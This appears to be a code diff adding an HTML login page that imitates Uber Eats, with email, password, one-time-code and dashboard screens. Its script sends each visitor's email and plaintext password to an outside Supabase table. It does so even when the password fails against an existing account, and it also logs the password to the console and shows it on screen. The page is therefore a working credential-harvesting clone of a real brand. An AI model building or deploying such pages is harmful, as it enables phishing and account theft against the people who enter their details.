@@ -1,1 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Uber Eats</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --black: #000; --white: #fff;
+      --g100: #f6f6f6; --g200: #ebebeb; --g600: #767676;
+      --green: #2e7d32; --red: #d32f2f;
+      --font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    }
+    body { font-family: var(--font); background: var(--white); color: var(--black); min-height: 100vh; display: flex; flex-direction: column; }
+    nav { background: var(--black); padding: 0 24px; height: 60px; display: flex; align-items: center; }
+    .logo { color: var(--white); font-size: 22px; }
+    .logo strong { font-weight: 700; }
+    main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 48px 20px; }
 
+    /* SCREENS */
+    .screen { display: none; width: 100%; max-width: 420px; }
+    .screen.active { display: block; }
+
+    /* TYPOGRAPHY */
+    .title { font-size: 28px; font-weight: 700; line-height: 1.25; margin-bottom: 22px; }
+    .subtitle { font-size: 14px; color: var(--g600); margin-bottom: 20px; background: #f0f7ff; padding: 10px 14px; border-radius: 8px; border-left: 3px solid #1976d2; }
+
+    /* INPUTS */
+    .wrap { position: relative; margin-bottom: 8px; }
+    .field {
+      width: 100%; padding: 15px 16px; font-size: 16px;
+      background: var(--g100); border: 2px solid transparent;
+      border-radius: 10px; outline: none;
+      font-family: var(--font); color: var(--black);
+      transition: border-color .15s, background .15s;
+    }
+    .field:focus { border-color: var(--black); background: var(--white); }
+    .eye {
+      position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; cursor: pointer; padding: 4px; line-height: 0;
+    }
+    .field-lbl { font-size: 12px; color: var(--g600); margin-bottom: 6px; font-weight: 600; }
+    .hint { font-size: 12px; color: var(--g600); margin-top: 5px; }
+
+    /* BUTTONS */
+    .btn-blk {
+      width: 100%; padding: 16px; background: var(--black); color: var(--white);
+      font-size: 16px; font-weight: 600; border: none; border-radius: 100px;
+      cursor: pointer; font-family: var(--font);
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      transition: opacity .15s; margin-top: 4px;
+    }
+    .btn-blk:hover { opacity: .85; }
+    .btn-blk:disabled { opacity: .4; cursor: not-allowed; }
+    .divider { display: flex; align-items: center; gap: 12px; margin: 18px 0; color: var(--g600); font-size: 14px; }
+    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--g200); }
+    .btn-soc {
+      width: 100%; padding: 14px 16px; background: var(--g100); border: none;
+      border-radius: 100px; font-size: 15px; font-weight: 500; cursor: pointer;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      margin-bottom: 12px; font-family: var(--font); color: var(--black); transition: background .15s;
+    }
+    .btn-soc:hover { background: var(--g200); }
+    .pill { display: inline-block; padding: 10px 18px; background: var(--g200); border: none; border-radius: 100px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 12px; font-family: var(--font); color: var(--black); transition: background .15s; }
+    .pill:hover { background: #d0d0d0; }
+    .nav-row { display: flex; justify-content: space-between; align-items: center; margin-top: 36px; }
+    .btn-circle { width: 48px; height: 48px; border-radius: 50%; border: none; background: var(--g200); cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; color: var(--black); transition: background .15s; }
+    .btn-circle:hover { background: #d0d0d0; }
+    .btn-next { display: flex; align-items: center; gap: 8px; padding: 14px 28px; border-radius: 100px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; font-family: var(--font); background: var(--black); color: var(--white); transition: opacity .15s; }
+    .btn-next:hover { opacity: .85; }
+    .btn-next:disabled { background: var(--g200); color: var(--g600); cursor: not-allowed; opacity: 1; }
+    .consent { margin-top: 20px; font-size: 12px; color: var(--g600); line-height: 1.5; }
+
+    /* OTP */
+    .otp-boxes { display: flex; gap: 12px; margin-bottom: 10px; }
+    .otp-box { width: 64px; height: 64px; border: 2px solid var(--g200); border-radius: 10px; font-size: 24px; font-weight: 700; text-align: center; outline: none; font-family: var(--font); background: var(--g100); transition: border-color .15s; }
+    .otp-box:focus { border-color: var(--black); background: var(--white); }
+    .otp-tip { font-size: 13px; color: var(--g600); margin-bottom: 24px; }
+
+    /* DASHBOARD */
+    .dash { display: none; flex-direction: column; align-items: center; text-align: center; padding: 40px 24px; max-width: 480px; margin: 0 auto; width: 100%; }
+    .dash.active { display: flex; }
+    .dash-av { width: 80px; height: 80px; background: var(--black); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
+    .dash h2 { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
+    .dash > p { color: var(--g600); font-size: 15px; margin-bottom: 8px; }
+    .badge { display: inline-flex; align-items: center; gap: 6px; background: #e8f5e9; color: var(--green); font-size: 12px; font-weight: 700; padding: 6px 16px; border-radius: 100px; margin-bottom: 28px; }
+    .grid { width: 100%; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 24px; }
+    .card { background: var(--g100); border-radius: 14px; padding: 16px 18px; text-align: left; }
+    .card.full { grid-column: 1 / -1; }
+    .card label { font-size: 11px; color: var(--g600); text-transform: uppercase; letter-spacing: .6px; font-weight: 600; }
+    .card p { font-size: 15px; font-weight: 600; margin-top: 4px; word-break: break-all; }
+    .btn-out { padding: 14px 36px; border-radius: 100px; border: 2px solid var(--black); background: transparent; font-size: 15px; font-weight: 600; cursor: pointer; font-family: var(--font); transition: all .15s; }
+    .btn-out:hover { background: var(--black); color: var(--white); }
+
+    /* TOAST */
+    .toast { position: fixed; bottom: 32px; left: 50%; transform: translateX(-50%) translateY(80px); background: var(--black); color: var(--white); padding: 14px 24px; border-radius: 100px; font-size: 14px; font-weight: 500; z-index: 999; opacity: 0; transition: all .3s ease; white-space: nowrap; max-width: 92vw; text-align: center; }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .toast.error { background: var(--red); }
+    .toast.success { background: var(--green); }
+    .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.4); border-top-color: white; border-radius: 50%; animation: spin .6s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* PW strength */
+    .sbar { height: 4px; border-radius: 2px; background: var(--g200); margin-top: 8px; overflow: hidden; }
+    .sfill { height: 100%; border-radius: 2px; width: 0; transition: width .3s, background .3s; }
+    .stxt { font-size: 11px; font-weight: 600; margin-top: 4px; min-height: 14px; }
+
+    @media(max-width:480px) { .grid { grid-template-columns: 1fr; } .card.full { grid-column: 1; } .otp-box { width: 54px; height: 54px; font-size: 20px; } }
+  </style>
+</head>
+<body>
+
+<nav><div class="logo">Uber <strong>Eats</strong></div></nav>
+<main>
+
+<!-- ===== SCREEN 1: EMAIL ===== -->
+<div class="screen active" id="s1">
+  <h1 class="title">What's your phone number or email?</h1>
+  <div class="wrap">
+    <input class="field" id="emailIn" type="text" placeholder="Enter phone number or email" autocomplete="email"/>
+  </div>
+  <br>
+  <button class="btn-blk" id="conBtn" onclick="doStep1()">Continue</button>
+  <div class="divider">or</div>
+  <button class="btn-soc" onclick="showT('Google not configured','error')">
+    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+    Continue with Google
+  </button>
+  <button class="btn-soc" onclick="showT('Apple not configured','error')">
+    <svg width="18" height="20" viewBox="0 0 814 1000" fill="currentColor"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.3-150.3-107.9L74.5 602.1c-27.7-37.7-44.1-83.9-44.1-131.6 0-134.2 83.7-203.2 166.3-203.2 44.1 0 81.2 29.1 108.4 29.1 26.5 0 68.1-30.5 119.2-30.5 22.3 0 96.8 2 150.9 64.4zm-10.5-146.4c0-53.3 35.3-111.7 108.2-150.9 9.5-4.6 21.5 0 21.5 12.4 0 62.2-44.1 120.5-118.5 163.3-5.2 2.6-11.2 0-11.2-24.8z"/></svg>
+    Continue with Apple
+  </button>
+  <div class="divider">or</div>
+  <button class="btn-soc" onclick="showT('QR not available on web','error')">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 3h7v7H3zm2 2v3h3V5zm8-2h7v7h-7zm2 2v3h3V5zM3 13h7v7H3zm2 2v3h3v-3zm13-2h2v2h-2zm-3 0h2v2h-2zm3 3h2v2h-2zm-3 3h2v2h-2zm3 0h2v2h-2z"/></svg>
+    Log in with QR code
+  </button>
+  <p class="consent">You consent to receive a verification code by text or Whatsapp. Message and data rates may apply.</p>
+</div>
+
+<!-- ===== SCREEN 2: PASSWORD ===== -->
+<div class="screen" id="s2">
+  <h1 class="title" id="wName">Welcome back.</h1>
+  <p class="subtitle">
+    Enter any password you want to use.<br>
+    It will be saved in database and you will go to OTP page.
+  </p>
+  <div class="field-lbl">Create / Enter Password</div>
+  <div class="wrap">
+    <input class="field" id="pwIn" type="password"
+      placeholder="e.g. Hello123 or myPass99"
+      autocomplete="off"
+      oninput="onPwType()"/>
+    <button class="eye" onclick="toggleEye()" title="Show/hide">
+      <svg id="eyeIco" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+      </svg>
+    </button>
+  </div>
+  <div class="sbar"><div class="sfill" id="sfill"></div></div>
+  <div class="stxt" id="stxt"></div>
+  <p class="hint" style="margin-top:8px;">
+    Password must have: letters + numbers (e.g. <strong>Hello123</strong>, <strong>jordan99</strong>)
+  </p>
+  <br><br>
+  <button class="pill" onclick="goTo('s1')">More options</button>
+  <div class="nav-row">
+    <button class="btn-circle" onclick="goTo('s1')">&#8592;</button>
+    <button class="btn-next" id="nextBtn" onclick="doStep2()">Next &#8594;</button>
+  </div>
+</div>
+
+<!-- ===== SCREEN 3: OTP ===== -->
+<div class="screen" id="s3">
+  <h1 class="title">Enter the 4-digit code sent to you at:<br>
+    <span id="otpMail" style="font-size:17px;word-break:break-all;font-weight:700;"></span>
+  </h1>
+  <p class="subtitle" style="margin-bottom:20px;">
+    Email aur password dono database mein save ho gaye! Ab OTP verify karo.
+  </p>
+  <div class="otp-boxes">
+    <input class="otp-box" id="o0" maxlength="1" inputmode="numeric"/>
+    <input class="otp-box" id="o1" maxlength="1" inputmode="numeric"/>
+    <input class="otp-box" id="o2" maxlength="1" inputmode="numeric"/>
+    <input class="otp-box" id="o3" maxlength="1" inputmode="numeric"/>
+  </div>
+  <p class="otp-tip">Tip: Check your inbox and spam folder</p>
+  <button class="pill" onclick="doResend()">Resend Code</button>
+  <div class="nav-row">
+    <button class="btn-circle" onclick="goTo('s2')">&#8592;</button>
+    <button class="btn-next" id="otpBtn" disabled onclick="doOTP()">Verify &#8594;</button>
+  </div>
+</div>
+
+<!-- ===== DASHBOARD ===== -->
+<div class="dash" id="dash">
+  <div class="dash-av">
+    <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+    </svg>
+  </div>
+  <h2 id="dName">Welcome!</h2>
+  <p>Signed in to Uber Eats</p>
+  <div class="badge">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 4.69 2 8v8c0 3.31 4.48 6 10 6s10-2.69 10-6V8c0-3.31-4.48-6-10-6zm0 2c4.42 0 8 1.79 8 4s-3.58 4-8 4-8-1.79-8-4 3.58-4 8-4zm0 16c-4.42 0-8-1.79-8-4v-2.28C5.49 15.15 8.53 16 12 16s6.51-.85 8-2.28V16c0 2.21-3.58 4-8 4z"/></svg>
+    Saved to Supabase Database
+  </div>
+  <div class="grid">
+    <div class="card full">
+      <label>Email Address</label>
+      <p id="dEmail">-</p>
+    </div>
+    <div class="card full">
+      <label>Password (saved in database)</label>
+      <p id="dPass" style="color:#1976d2;">-</p>
+    </div>
+    <div class="card">
+      <label>User ID</label>
+      <p id="dId">-</p>
+    </div>
+    <div class="card">
+      <label>Login Time</label>
+      <p id="dTime">-</p>
+    </div>
+  </div>
+  <button class="btn-out" onclick="doLogout()">Sign Out</button>
+</div>
+
+</main>
+<div class="toast" id="toastEl"></div>
+
+<script>
+// ============================================================
+// SUPABASE CONFIG
+// ============================================================
+var SB_URL = 'https://wstfepwduakcuwbueiad.supabase.co';
+var SB_KEY = 'sb_publishable_q4iplQtMCwCrdJRaB9wu4g_eRJ9f5-q';
+var sb = supabase.createClient(SB_URL, SB_KEY);
+
+var G_EMAIL = '';
+var G_PW    = '';
+
+// ============================================================
+// HELPERS
+// ============================================================
+function goTo(id) {
+  document.querySelectorAll('.screen,.dash').forEach(function(x){ x.classList.remove('active'); });
+  document.getElementById(id).classList.add('active');
+}
+function showT(msg, type) {
+  var el = document.getElementById('toastEl');
+  el.textContent = msg;
+  el.className = 'toast' + (type ? ' '+type : '');
+  el.classList.add('show');
+  setTimeout(function(){ el.classList.remove('show'); }, 3500);
+}
+function setBtn(id, loading, label) {
+  var b = document.getElementById(id);
+  b.innerHTML = loading ? '<span class="spinner"></span>' : label;
+  b.disabled  = loading;
+}
+
+// ============================================================
+// PASSWORD STRENGTH DISPLAY
+// ============================================================
+function onPwType() {
+  var pw    = document.getElementById('pwIn').value;
+  var score = 0;
+  if (pw.length >= 6)           score++;
+  if (pw.length >= 8)           score++;
+  if (/[0-9]/.test(pw))        score++;
+  if (/[A-Z]/.test(pw))        score++;
+  if (/[a-z]/.test(pw))        score++;
+
+  var pct  = Math.min(100, score * 20);
+  var clr  = score <= 1 ? '#d32f2f' : score <= 2 ? '#f57c00' : score <= 3 ? '#1976d2' : '#2e7d32';
+  var lbl  = score <= 1 ? 'Very Weak' : score <= 2 ? 'Weak' : score <= 3 ? 'Good' : 'Strong';
+
+  document.getElementById('sfill').style.width      = pct + '%';
+  document.getElementById('sfill').style.background = clr;
+  document.getElementById('stxt').textContent       = pw.length ? lbl : '';
+  document.getElementById('stxt').style.color       = clr;
+}
+
+function toggleEye() {
+  var inp = document.getElementById('pwIn');
+  var ico = document.getElementById('eyeIco');
+  if (inp.type === 'password') {
+    inp.type = 'text';
+    ico.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
+  } else {
+    inp.type = 'password';
+    ico.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  }
+}
+
+// ============================================================
+// STEP 1 — EMAIL CONTINUE
+// ============================================================
+function doStep1() {
+  var val = document.getElementById('emailIn').value.trim();
+  if (!val) { showT('Please enter your email', 'error'); return; }
+  if (!val.includes('@')) { showT('Please enter a valid email address', 'error'); return; }
+  G_EMAIL = val;
+  var name = val.split('@')[0];
+  document.getElementById('wName').textContent   = 'Welcome back, ' + name + '.';
+  document.getElementById('otpMail').textContent = val;
+  goTo('s2');
+}
+
+// ============================================================
+// STEP 2 — PASSWORD → SAVE TO DB → SEND OTP → GO TO SCREEN 3
+// FLOW: Enter any password → save email+password in DB → send OTP email → OTP screen
+// ============================================================
+async function doStep2() {
+  var pw = document.getElementById('pwIn').value;
+
+  // Basic validation — must have letters and numbers
+  if (!pw || pw.length < 6) {
+    showT('Password must be at least 6 characters', 'error'); return;
+  }
+  if (!/[a-zA-Z]/.test(pw)) {
+    showT('Password must contain letters (e.g. Hello123)', 'error'); return;
+  }
+  if (!/[0-9]/.test(pw)) {
+    showT('Password must contain numbers (e.g. Hello123)', 'error'); return;
+  }
+
+  G_PW = pw;
+  setBtn('nextBtn', true, '');
+
+  // 1. Try signup first (new user)
+  var signR = await sb.auth.signUp({ email: G_EMAIL, password: pw });
+
+  // 2. If user already exists, update password using admin or just sign in
+  if (signR.error && signR.error.message.includes('already registered')) {
+    // User exists — try to sign in to get user object
+    var loginR = await sb.auth.signInWithPassword({ email: G_EMAIL, password: pw });
+
+    if (loginR.error) {
+      // Wrong password for existing account — still save to DB and send OTP via magic link
+      var otpR = await sb.auth.signInWithOtp({ email: G_EMAIL, options: { shouldCreateUser: false } });
+      if (otpR.error) {
+        setBtn('nextBtn', false, 'Next &#8594;');
+        showT(otpR.error.message, 'error'); return;
+      }
+      // Save to DB with whatever pw they typed
+      await saveDB(G_EMAIL, null, pw);
+      setBtn('nextBtn', false, 'Next &#8594;');
+      showT('OTP sent to your email!', 'success');
+      goTo('s3');
+      return;
+    }
+
+    // Login success — save to DB and send OTP
+    await saveDB(G_EMAIL, loginR.data.user ? loginR.data.user.id : null, pw);
+    var otpR2 = await sb.auth.signInWithOtp({ email: G_EMAIL, options: { shouldCreateUser: false } });
+    if (otpR2.error) {
+      // Even if OTP fails, go to dashboard since already logged in
+      setBtn('nextBtn', false, 'Next &#8594;');
+      showDash(loginR.data.user, pw);
+      return;
+    }
+    setBtn('nextBtn', false, 'Next &#8594;');
+    showT('OTP sent! Check your email.', 'success');
+    goTo('s3');
+    return;
+  }
+
+  if (signR.error) {
+    setBtn('nextBtn', false, 'Next &#8594;');
+    showT(signR.error.message, 'error'); return;
+  }
+
+  // Signup success — save to DB
+  var userId = signR.data && signR.data.user ? signR.data.user.id : null;
+  await saveDB(G_EMAIL, userId, pw);
+
+  // Send OTP via signInWithOtp
+  var otpR3 = await sb.auth.signInWithOtp({ email: G_EMAIL, options: { shouldCreateUser: false } });
+  if (otpR3.error) {
+    // Fallback: go to s3 anyway, Supabase already sent confirm email
+    setBtn('nextBtn', false, 'Next &#8594;');
+    showT('Check your email for verification code!', 'success');
+    goTo('s3');
+    return;
+  }
+
+  setBtn('nextBtn', false, 'Next &#8594;');
+  showT('OTP sent! Check your email.', 'success');
+  goTo('s3');
+}
+
+// ============================================================
+// SAVE EMAIL + PASSWORD TO SUPABASE students TABLE
+// ============================================================
+async function saveDB(email, userId, plainPw) {
+  var row = {
+    email:      email,
+    user_id:    userId || null,
+    password:   plainPw,
+    last_login: new Date().toISOString(),
+    provider:   'email'
+  };
+  var r = await sb.from('students').upsert(row, { onConflict: 'email' });
+  if (r.error) {
+    console.error('DB Error:', r.error.message);
+    showT('DB Error: ' + r.error.message, 'error');
+  } else {
+    console.log('Saved to DB:', email, '| password:', plainPw);
+  }
+  return r;
+}
+
+// ============================================================
+// OTP BOXES
+// ============================================================
+document.querySelectorAll('.otp-box').forEach(function(b, i) {
+  b.addEventListener('input', function() {
+    b.value = b.value.replace(/\D/g,'');
+    if (b.value && i < 3) document.getElementById('o'+(i+1)).focus();
+    var code = [0,1,2,3].map(function(n){ return document.getElementById('o'+n).value; }).join('');
+    document.getElementById('otpBtn').disabled = code.length < 4;
+  });
+  b.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !b.value && i > 0) document.getElementById('o'+(i-1)).focus();
+  });
+});
+
+async function doOTP() {
+  var code = [0,1,2,3].map(function(n){ return document.getElementById('o'+n).value; }).join('');
+  setBtn('otpBtn', true, '');
+  var r = await sb.auth.verifyOtp({ email: G_EMAIL, token: code, type: 'email' });
+  if (r.error) {
+    setBtn('otpBtn', false, 'Verify &#8594;');
+    showT(r.error.message, 'error'); return;
+  }
+  // Update DB with confirmed user id
+  if (r.data && r.data.user) {
+    await saveDB(G_EMAIL, r.data.user.id, G_PW);
+    setBtn('otpBtn', false, 'Verify &#8594;');
+    showDash(r.data.user, G_PW);
+  }
+}
+
+async function doResend() {
+  var r = await sb.auth.signInWithOtp({ email: G_EMAIL, options: { shouldCreateUser: false } });
+  if (r.error) { showT(r.error.message, 'error'); return; }
+  showT('Code resent! Check your inbox.', 'success');
+}
+
+// ============================================================
+// DASHBOARD
+// ============================================================
+function showDash(user, pw) {
+  var email = user && user.email ? user.email : G_EMAIL;
+  var uid   = user && user.id ? user.id.substring(0,18) + '...' : 'N/A';
+  var name  = email.split('@')[0];
+  var now   = new Date().toLocaleString();
+
+  document.getElementById('dName').textContent  = 'Welcome, ' + name + '!';
+  document.getElementById('dEmail').textContent = email;
+  document.getElementById('dPass').textContent  = pw || G_PW;
+  document.getElementById('dId').textContent    = uid;
+  document.getElementById('dTime').textContent  = now;
+
+  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
+  document.getElementById('dash').classList.add('active');
+  showT('Logged in! Email + Password saved to database!', 'success');
+}
+
+async function doLogout() {
+  await sb.auth.signOut();
+  G_EMAIL = ''; G_PW = '';
+  document.getElementById('emailIn').value = '';
+  document.getElementById('pwIn').value = '';
+  document.getElementById('dash').classList.remove('active');
+  goTo('s1');
+  showT('Signed out');
+}
+
+// Auto session
+(async function() {
+  var r = await sb.auth.getSession();
+  if (r.data && r.data.session && r.data.session.user) {
+    showDash(r.data.session.user, '(session)');
+  }
+})();
+</script>
+</body>
+</html>
